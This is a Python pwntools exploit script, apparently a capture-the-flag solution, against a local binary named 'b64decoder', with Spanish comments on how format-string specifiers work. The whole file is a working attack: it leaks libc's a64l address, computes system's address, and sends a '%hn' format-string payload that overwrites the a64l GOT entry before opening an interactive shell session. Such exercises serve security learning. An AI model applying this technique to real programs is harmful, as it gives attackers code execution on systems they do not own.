# -*- coding: utf-8 -*-

import os

from pwn import * 

A64L_OFFSET = os.popen('objdump -D /lib32/libc.so.6  | grep a64l | cut -d" " -f 1').read().split()[0]
SYSTEM_OFFSET = os.popen('objdump -D /lib32/libc.so.6  | grep system | cut -d" " -f 1').read().split()[0]

p = process("./b64decoder")


p.recvuntil("Each number from 0 to 63 is mapped to an ASCII character.  For example, 'z' is 63")
p.recvline()

A64L_GOT = 0x804b398
A64L_ABSOLUTE = p.recvline().split()[-1].replace("(", "").replace(")", "")

LIBC_ADDRESS = int(A64L_ABSOLUTE, 16) - int(A64L_OFFSET, 16)
SYSTEM_ABSOLUTE = int(SYSTEM_OFFSET, 16) + LIBC_ADDRESS


print("    FUNCTION    | OFFSET    | ABOLUSTE    | GOT    ")
print("      A64L      " + str(A64L_OFFSET) + "   " + str(A64L_ABSOLUTE) +  "   " + str(A64L_GOT))
print("     SYSTEM     " + str(SYSTEM_OFFSET) + "   " + hex(SYSTEM_ABSOLUTE) +  "   ")

#print("system offset: " + SYSTEM_OFFSET)
#print("a64l complete address: " + A64L_ABSOLUTE)
print("LIBC ADDRESS:" + hex(LIBC_ADDRESS))


p.recvuntil("Enter your name!")

last_2bytes = SYSTEM_ABSOLUTE & 0xffff
stack_position = 75

payload = "%{}x%{}$hn".format(str(last_2bytes), stack_position)


while (len(payload) % 4) != 0: 
    payload += 'A'


# A64_GOT       ->  A64_ABSOLUTE
# 0x080490a0    ->  0xf7d73390
# A64_GOT -> SYSTEM_ABSOLUTE 

# 0xasdasdasd       0xasdasldkalsd
# 0xpayload         0xpayload
# 0xpayload   75 -> 0xA64_GOT+

#%p = %x (p de punteros y x de hexadecimal, p te imprime el tamanio de la palabra y empieza por 0x mientras que x siempre 4 bytes)
#%x -> "ffaaffaa"
#%10x -> "  ffaaffaa"

#%x -> "3"
#%10x -> "         3"
#-----------------------------
#%p -> "0xffaaffaa"
#%10p -> "0xffaaffaa"

#%p -> "0x3"
#%10p -> "       0x3"
#-----------------------------


#%74$p -> payload El %p imprime el contenido de la posicion X, en este caso 64, de la stack no el contenido del contenido de esa posicion
#%75$n -> A64_GOT El %n se mete en la dirección a la que está apuntando esa posición de la stack y escribe ahi

# Quiero escribir SYSTEM_ABSOLUTE en A64_GOT (los 2 ultimos bytes)


payload += p32(A64L_GOT)

attach(p)
p.sendline(payload)
print(hexdump(payload))
#p.sendline("cat flag.txt")


p.interactive()
